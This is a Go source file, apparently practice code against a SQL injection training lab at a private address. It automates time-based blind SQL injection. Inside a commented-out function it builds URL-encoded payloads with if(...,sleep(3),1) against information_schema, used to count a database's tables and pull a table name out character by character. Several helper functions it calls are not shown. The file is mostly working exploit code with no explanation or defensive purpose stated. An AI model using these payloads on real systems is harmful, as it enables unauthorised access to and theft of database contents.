package main

import (
	"fmt"
	"sync"
)

type Info struct {
	name     string
	length   int
	subCount int
}

var cost bool = false
var tbNames = ""
var costpayload sync.Mutex
var ch = make(chan struct{})

func main1() {
	defer timeCost1()()
	letters := letter()
	//tablesName(letters)
	//dbinfo := getDBinfo(letters)
	//fmt.Printf("db name length:%d;db name content:%s;db tables count:%d\n",dbinfo.length,dbinfo.name,dbinfo.subCount)
	//length := getDBLength()
	dbName := make(chan string, 8)
	go getDBName(8, letters, dbName)
	fmt.Println(<-dbName)
	fmt.Println("Table Name:" + tbNames)
}

/*func tablesName(letters map[int]string) string {
	i := 0
	for {
		tabnumUrl := "http://192.168.1.48/Less-5/index.php?id=1%27%20and%20if((select%20count(table_name)from%20information_schema.tables%20where%20table_schema=database())=" + strconv.Itoa(i) + ",sleep(3),1)%20--%20d"
		payload(tabnumUrl)
		if cost {
			break
		}
		i++
	}
	namelen := 1
	for {
		tabNameLenUrl := "http://192.168.1.48/Less-5/index.php?id=1%27%20and%20" +
			"if(length((select%20table_name%20from%20information_schema.tables" +
			"%20where%20table_schema=database()%20limit%200,1))=" + strconv.Itoa(namelen) + ",sleep(3),1)%20--%20d"
		payload(tabNameLenUrl)
		if cost {
			break
		}
		namelen++
	}
loop:
	for i := 0; i <= namelen; i++ {
		for _, letter := range letters {
			str := tbNames
			str += letter
			tabNameUrl := "http://192.168.1.48/Less-5/index.php?id=1%27%20and%20if(left((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1)," + strconv.Itoa(i) + ")=%27" + str + "%27,sleep(3),1)%20--%20d"
			//fmt.Println(tabNameUrl)
			payload(tabNameUrl)
			if cost {
				tbNames += letter
				continue loop
			}
		}
	}
	return tbNames
}*/
